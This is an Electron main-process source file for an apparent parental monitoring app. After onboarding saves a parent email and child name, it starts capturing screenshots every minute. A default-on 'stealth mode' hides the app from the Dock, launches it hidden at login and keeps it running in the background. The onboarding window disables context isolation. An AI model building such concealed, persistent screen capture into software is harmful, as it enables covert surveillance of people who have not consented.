/**
 * Main Process Entry Point
 * Handles application lifecycle, window management, and initialization
 */

import { app, BrowserWindow, protocol, ipcMain } from 'electron';
import log from 'electron-log';
import Store from 'electron-store';
import path from 'path';
import { createMainWindow } from './windows/mainWindow';
import { setupIpcHandlers } from './handlers';
import { initializeServices } from './services';
import { setupSystemTray } from './tray/systemTray';
import { setupAutoUpdater } from './services/autoUpdater';
import { setupSecurityPolicies } from './security/policies';

// Configure logging
log.transports.file.level = 'info';
log.transports.console.level = 'debug';

// Initialize electron-store
const store = new Store();

// Global reference to main window
let mainWindow: BrowserWindow | null = null;
let onboardingWindow: BrowserWindow | null = null;

// Check if running in development
const isDevelopment = process.env.NODE_ENV === 'development';
const isProduction = !isDevelopment;

// Stealth mode configuration
const STEALTH_MODE_ENABLED = process.env.STEALTH_MODE !== 'false'; // Default: enabled

// STEALTH MODE: Hide from dock on macOS
if (STEALTH_MODE_ENABLED && process.platform === 'darwin') {
  app.dock.hide();
  log.info('Stealth mode: Hidden from macOS Dock');
}

// STEALTH MODE: Auto-launch on system startup
if (STEALTH_MODE_ENABLED) {
  app.setLoginItemSettings({
    openAtLogin: true,
    openAsHidden: true,
  });
  log.info('Stealth mode: Auto-launch enabled');
}

/**
 * Check if onboarding is complete
 */
function isOnboardingComplete(): boolean {
  const onboarded = store.get('onboarding.completed', false) as boolean;
  log.info(`Onboarding status: ${onboarded ? 'completed' : 'not completed'}`);
  return onboarded;
}

/**
 * Create onboarding window
 */
function createOnboardingWindow(): BrowserWindow {
  log.info('Creating onboarding window...');
  
  onboardingWindow = new BrowserWindow({
    width: 600,
    height: 700,
    show: true,
    resizable: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  // Open DevTools for debugging
  if (isDevelopment) {
    onboardingWindow.webContents.openDevTools();
  }

  // Load onboarding HTML
  const onboardingPath = path.join(__dirname, '../../../public/onboarding.html');
  log.info('Loading onboarding from:', onboardingPath);
  
  onboardingWindow.loadFile(onboardingPath).then(() => {
    log.info('Onboarding page loaded successfully');
  }).catch((error) => {
    log.error('Error loading onboarding page:', error);
    log.info('Trying alternative path...');
    
    // Try alternative paths
    const altPath = path.join(process.cwd(), 'public', 'onboarding.html');
    log.info('Alternative path:', altPath);
    
    onboardingWindow?.loadFile(altPath).catch((err) => {
      log.error('Alternative path also failed:', err);
    });
  });

  // Log when page finishes loading
  onboardingWindow.webContents.on('did-finish-load', () => {
    log.info('Onboarding window finished loading');
  });

  // Log any console messages from the window
  onboardingWindow.webContents.on('console-message', (_event, _level, message) => {
    log.info(`[Onboarding Console] ${message}`);
  });

  onboardingWindow.on('closed', () => {
    onboardingWindow = null;
    log.info('Onboarding window closed');
  });

  log.info('Onboarding window created');
  return onboardingWindow;
}

/**
 * Create the main application window
 */
async function createWindow() {
  try {
    log.info('Creating main window...');
    
    // Create the main window (hidden initially if stealth mode)
    mainWindow = createMainWindow(isDevelopment, STEALTH_MODE_ENABLED);

    // Setup IPC handlers
    setupIpcHandlers(mainWindow, store);

    // Initialize services
    await initializeServices(mainWindow, store);

    // Setup system tray
    setupSystemTray(mainWindow, store);

    // Setup auto updater (production only)
    if (isProduction) {
      setupAutoUpdater(mainWindow);
    }

    log.info('Main window created successfully');
  } catch (error) {
    log.error('Error creating main window:', error);
    throw error;
  }
}

/**
 * Start automatic screenshot capture
 */
let screenshotInterval: NodeJS.Timeout | null = null;
const SCREENSHOT_INTERVAL = 60 * 1000; // 1 minute

async function startAutomaticScreenshots() {
  log.info('Starting automatic screenshot capture...');
  
  // Import the screenshot manager directly
  const { ScreenshotManager } = await import('./services/monitoring/screenshotManager');
  const screenshotManager = new ScreenshotManager(mainWindow!, store);
  
  // Capture immediately on start
  try {
    const screenshots = await screenshotManager.captureScreenshot();
    log.info(`Initial capture: ${screenshots.length} screenshot(s) saved`);
  } catch (error) {
    log.error('Error in initial screenshot capture:', error);
  }
  
  // Then capture every minute
  screenshotInterval = setInterval(async () => {
    try {
      const screenshots = await screenshotManager.captureScreenshot();
      log.info(`Automatic capture: ${screenshots.length} screenshot(s) saved`);
    } catch (error) {
      log.error('Error in automatic screenshot capture:', error);
    }
  }, SCREENSHOT_INTERVAL);
  
  log.info(`Automatic screenshots enabled (every ${SCREENSHOT_INTERVAL / 1000} seconds)`);
}

/**
 * Stop automatic screenshot capture
 */
function stopAutomaticScreenshots() {
  if (screenshotInterval) {
    clearInterval(screenshotInterval);
    screenshotInterval = null;
    log.info('Automatic screenshots stopped');
  }
}

/**
 * Handle onboarding completion
 */
ipcMain.on('onboarding-complete', async (_event, data) => {
  log.info('Onboarding completed:', data);
  
  // Save onboarding data
  store.set('onboarding.completed', true);
  store.set('onboarding.parentEmail', data.parentEmail);
  store.set('onboarding.childName', data.childName);
  store.set('onboarding.setupDate', new Date().toISOString());
  
  log.info('Onboarding data saved to store');
  
  // Close onboarding window after 3 seconds
  setTimeout(async () => {
    if (onboardingWindow && !onboardingWindow.isDestroyed()) {
      onboardingWindow.close();
      log.info('Onboarding window closed automatically');
    }
    
    // Create main window if not already created
    if (!mainWindow) {
      await createWindow();
      log.info('Main window created after onboarding');
      
      // Start automatic screenshot capture
      startAutomaticScreenshots();
    } else {
      // If main window exists, just ensure tray is set up
      setupSystemTray(mainWindow, store);
      log.info('System tray refreshed after onboarding');
    }
  }, 3000);
});

// Register custom protocols BEFORE app is ready
protocol.registerSchemesAsPrivileged([
  {
    scheme: 'app',
    privileges: {
      standard: true,
      secure: true,
      supportFetchAPI: true,
    },
  },
]);

/**
 * Initialize the application
 */
async function initializeApp() {
  try {
    log.info('Initializing application...');

    // Setup security policies
    setupSecurityPolicies();

    log.info('Application initialized successfully');
  } catch (error) {
    log.error('Error initializing application:', error);
    throw error;
  }
}

/**
 * Application ready handler
 */
app.whenReady().then(async () => {
  try {
    await initializeApp();
    
    // Check if onboarding is complete
    if (!isOnboardingComplete()) {
      // First run: Show onboarding window
      log.info('First run detected - showing onboarding');
      createOnboardingWindow();
    } else {
      // Already onboarded: Create main window (hidden if stealth mode)
      log.info('Onboarding complete - creating main window');
      await createWindow();
      
      // In stealth mode, keep window hidden
      if (STEALTH_MODE_ENABLED && mainWindow) {
        mainWindow.hide();
        log.info('Stealth mode: Main window hidden');
      }
      
      // Start automatic screenshot capture
      startAutomaticScreenshots();
    }

    // macOS: Re-create window when dock icon is clicked
    app.on('activate', () => {
      if (BrowserWindow.getAllWindows().length === 0) {
        if (isOnboardingComplete()) {
          createWindow();
        } else {
          createOnboardingWindow();
        }
      } else if (mainWindow) {
        mainWindow.show();
      }
    });
  } catch (error) {
    log.error('Error in app ready handler:', error);
    app.quit();
  }
});

/**
 * Window all closed handler
 */
app.on('window-all-closed', () => {
  // In stealth mode, keep app running in background
  if (STEALTH_MODE_ENABLED) {
    log.info('Stealth mode: App continues running in background');
    return;
  }
  
  // On macOS, keep the app running even when all windows are closed
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

/**
 * Before quit handler
 */
app.on('before-quit', () => {
  log.info('Application is quitting...');
  
  // Stop automatic screenshots
  stopAutomaticScreenshots();
  
  // Cleanup will be handled by individual services
});

/**
 * Handle second instance launch
 */
const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
  log.warn('Another instance is already running');
  app.quit();
} else {
  app.on('second-instance', () => {
    // Focus the main window if someone tries to open another instance
    if (mainWindow) {
      if (mainWindow.isMinimized()) {
        mainWindow.restore();
      }
      mainWindow.focus();
    }
  });
}

/**
 * Handle uncaught exceptions
 */
process.on('uncaughtException', (error) => {
  log.error('Uncaught exception:', error);
});

process.on('unhandledRejection', (reason) => {
  log.error('Unhandled rejection:', reason);
});

// Export for testing
export { mainWindow };

